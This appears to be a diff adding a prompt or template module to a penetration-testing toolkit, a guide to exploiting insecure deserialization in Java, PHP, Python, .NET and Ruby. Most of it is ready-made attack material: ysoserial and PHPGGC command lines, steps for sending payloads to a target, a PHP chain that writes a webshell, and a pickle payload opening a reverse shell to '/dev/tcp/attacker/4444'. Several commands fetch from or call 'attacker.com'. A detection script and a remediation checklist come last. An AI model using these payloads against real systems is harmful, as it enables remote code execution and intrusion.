@@ -1,0 +1,385 @@
+{# Insecure Deserialization Module #}
+{# Comprehensive deserialization vulnerability testing #}
+
+<deserialization_module>
+
+## INSECURE DESERIALIZATION GUIDE
+
+### UNDERSTANDING DESERIALIZATION
+
+**What is it?**
+Deserialization converts a stream of bytes back into an object. When user-controlled data is deserialized without validation, attackers can craft malicious serialized objects leading to RCE.
+
+**Common Vulnerable Languages:**
+- Java (ObjectInputStream)
+- PHP (unserialize)
+- Python (pickle, yaml)
+- Ruby (Marshal)
+- .NET (BinaryFormatter)
+
+### JAVA DESERIALIZATION
+
+**Detection:**
+```
+# Magic bytes for Java serialized objects
+AC ED 00 05 (hex)
+rO0AB (base64)
+
+# Common content types
+Content-Type: application/x-java-serialized-object
+Content-Type: application/octet-stream
+
+# Cookie/parameter patterns
+Look for base64 that starts with "rO0AB"
+```
+
+**Common Gadget Chains:**
+```
+CommonsCollections1-7 (Apache Commons Collections)
+CommonsBeanutils1
+Spring1-4
+JBossInterceptors1
+FileUpload1
+Jdk7u21
+Hibernate1-5
+Groovy1
+Clojure
+```
+
+**ysoserial Payloads:**
+```bash
+# Generate payload with ysoserial
+java -jar ysoserial.jar CommonsCollections1 'curl attacker.com' > payload.bin
+
+# Base64 encode for HTTP
+cat payload.bin | base64 -w0
+
+# Common gadgets
+java -jar ysoserial.jar CommonsCollections5 'ping attacker.com'
+java -jar ysoserial.jar CommonsCollections7 'whoami > /tmp/pwned'
+java -jar ysoserial.jar CommonsBeanutils1 'wget http://attacker.com/shell.sh'
+```
+
+**Exploitation Steps:**
+```bash
+# 1. Identify serialization
+# Look for rO0AB in cookies, parameters, requests
+
+# 2. Generate payload
+java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/?pwned=1' | base64
+
+# 3. Send payload
+curl -X POST https://target.com/api \
+  -H "Content-Type: application/x-java-serialized-object" \
+  --data-binary @payload.bin
+
+# 4. Or via cookie
+curl https://target.com/ \
+  -H "Cookie: session=$(cat payload.bin | base64)"
+```
+
+**Bypass Techniques:**
+```java
+// JEP 290 bypass techniques
+// Use different gadget chains
+// Modify serialVersionUID
+// Use property-oriented programming
+```
+
+### PHP DESERIALIZATION
+
+**Magic Methods:**
+```php
+__construct()   // Created
+__destruct()    // Destroyed
+__wakeup()      // Unserialized
+__toString()    // Object to string
+__call()        // Inaccessible method called
+__get()         // Inaccessible property read
+__set()         // Inaccessible property written
+```
+
+**Detection:**
+```
+# PHP serialized format
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
+
+# URL encoded
+O%3A4%3A%22User%22%3A2%3A...
+```
+
+**Exploitation:**
+```php
+// If class exists with dangerous __destruct
+class TempFile {
+    public $filename;
+    public function __destruct() {
+        unlink($this->filename);  // Delete arbitrary file
+    }
+}
+
+// Payload
+O:8:"TempFile":1:{s:8:"filename";s:11:"/etc/passwd";}
+
+// POP chain example
+class Logger {
+    public $logfile;
+    public function __destruct() {
+        file_put_contents($this->logfile, "logged");
+    }
+}
+// Payload to write webshell
+$obj = new Logger();
+$obj->logfile = "/var/www/html/shell.php";
+echo serialize($obj);
+```
+
+**PHPGGC (Gadget Chains):**
+```bash
+# List available gadgets
+phpggc -l
+
+# Generate payload
+phpggc Laravel/RCE1 system 'id' -b
+
+# Common frameworks
+phpggc Symfony/RCE4 'system' 'whoami'
+phpggc Monolog/RCE1 'system' 'id'
+phpggc Guzzle/RCE1 'system' 'cat /etc/passwd'
+phpggc Doctrine/RCE1 'system' 'id'
+```
+
+**phar:// Deserialization:**
+```php
+// Create malicious PHAR
+$phar = new Phar('evil.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'test');
+$phar->setStub('<?php __HALT_COMPILER();');
+$payload = new MaliciousClass();
+$phar->setMetadata($payload);
+$phar->stopBuffering();
+
+// Trigger via file operations
+file_get_contents('phar://uploads/evil.jpg');
+file_exists('phar://uploads/evil.jpg');
+include('phar://uploads/evil.jpg');
+```
+
+### PYTHON DESERIALIZATION
+
+**pickle Exploitation:**
+```python
+import pickle
+import os
+import base64
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+# Generate payload
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+
+# More sophisticated payload
+class Exploit:
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.Popen, 
+                (('bash', '-c', 'bash -i >& /dev/tcp/attacker/4444 0>&1'),))
+```
+
+**YAML Deserialization:**
+```yaml
+# PyYAML unsafe load
+!!python/object/apply:os.system ['id']
+!!python/object/new:subprocess.Popen ['id']
+!!python/object/apply:subprocess.check_output [['id']]
+
+# More complex
+!!python/object/apply:builtins.eval ["__import__('os').system('id')"]
+```
+
+### .NET DESERIALIZATION
+
+**Detection:**
+```
+# BinaryFormatter magic bytes
+00 01 00 00 00 FF FF FF FF
+
+# Common entry points
+ViewState (ASP.NET)
+SOAP messages
+RemotingServices
+```
+
+**ysoserial.net Payloads:**
+```bash
+# Generate payload
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
+
+# Common gadgets
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
+ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "powershell -enc ..."
+ysoserial.exe -g PSObject -f BinaryFormatter -c "calc"
+```
+
+**ViewState Exploitation:**
+```bash
+# If MachineKey is known
+ysoserial.exe -p ViewState -g TextFormattingRunProperties \
+  --validationalg="SHA1" \
+  --validationkey="..." \
+  --generator="..." \
+  -c "powershell -enc ..."
+```
+
+### RUBY DESERIALIZATION
+
+**Marshal Exploitation:**
+```ruby
+require 'base64'
+
+class Exploit
+  def initialize(cmd)
+    @cmd = cmd
+  end
+  
+  def call
+    system(@cmd)
+  end
+end
+
+# Generate payload
+payload = Base64.strict_encode64(Marshal.dump(Exploit.new('id')))
+```
+
+**Universal Gadget Chain:**
+```ruby
+# Gadget chain using Gem::Requirement
+require 'rubygems'
+
+class Gem::Requirement
+  def marshal_dump
+    [@requirements]
+  end
+  
+  def marshal_load(array)
+    @requirements = array
+  end
+end
+
+evil = Gem::Requirement.allocate
+# ... complex gadget chain setup
+```
+
+### DETECTION TIPS
+
+**Java:**
+- Look for `rO0AB` in requests
+- Check for `ObjectInputStream` in code
+- Monitor for known gadget classes
+
+**PHP:**
+- Look for `O:` or `a:` patterns
+- Check `unserialize()` usage
+- Monitor file operations with `phar://`
+
+**Python:**
+- Check for `pickle.loads()` or `yaml.load()`
+- Look for base64 encoded pickle data
+- Monitor for `__reduce__` in classes
+
+### AUTOMATION SCRIPT
+
+```python
+#!/usr/bin/env python3
+"""
+Deserialization Detection Script
+"""
+
+import re
+import base64
+
+def detect_java_serial(data):
+    """Detect Java serialized objects."""
+    # Check for magic bytes in base64
+    patterns = [
+        r'rO0AB[A-Za-z0-9+/]+=*',  # Base64 Java serialized
+        b'\xac\xed\x00\x05',        # Raw magic bytes
+    ]
+    
+    if isinstance(data, str):
+        if re.search(patterns[0], data):
+            return "Java serialized object detected (base64)"
+    elif isinstance(data, bytes):
+        if data.startswith(patterns[1]):
+            return "Java serialized object detected (binary)"
+    return None
+
+def detect_php_serial(data):
+    """Detect PHP serialized objects."""
+    php_patterns = [
+        r'O:\d+:"[^"]+":',  # Object
+        r'a:\d+:{',         # Array
+        r's:\d+:"',         # String
+    ]
+    
+    for pattern in php_patterns:
+        if re.search(pattern, data):
+            return "PHP serialized data detected"
+    return None
+
+def detect_pickle(data):
+    """Detect Python pickle data."""
+    try:
+        decoded = base64.b64decode(data)
+        # Pickle opcodes
+        if decoded.startswith((b'\x80\x03', b'\x80\x04', b'\x80\x05')):
+            return "Python pickle detected"
+        if b'__reduce__' in decoded or b'posix' in decoded:
+            return "Potential pickle RCE payload"
+    except:
+        pass
+    return None
+
+def scan_request(headers, body, cookies):
+    """Scan HTTP request for deserialization."""
+    findings = []
+    
+    # Check all data sources
+    for name, data in [('Body', body), ('Cookies', str(cookies))]:
+        result = detect_java_serial(data)
+        if result:
+            findings.append(f"{name}: {result}")
+        
+        result = detect_php_serial(data)
+        if result:
+            findings.append(f"{name}: {result}")
+        
+        result = detect_pickle(data)
+        if result:
+            findings.append(f"{name}: {result}")
+    
+    return findings
+
+if __name__ == "__main__":
+    # Test detection
+    test_data = "rO0ABXNyABlqYXZheC5zd2luZy5ldmVudC5FdmVudA=="
+    print(detect_java_serial(test_data))
+```
+
+### REMEDIATION
+
+- [ ] Avoid deserializing untrusted data
+- [ ] Use safe alternatives (JSON, XML)
+- [ ] Implement integrity checks (signatures)
+- [ ] Use allowlists for classes
+- [ ] Keep libraries updated
+- [ ] Enable JEP 290 filters (Java)
+- [ ] Use json_decode instead of unserialize (PHP)
+- [ ] Avoid pickle for untrusted data (Python)
+
+</deserialization_module>
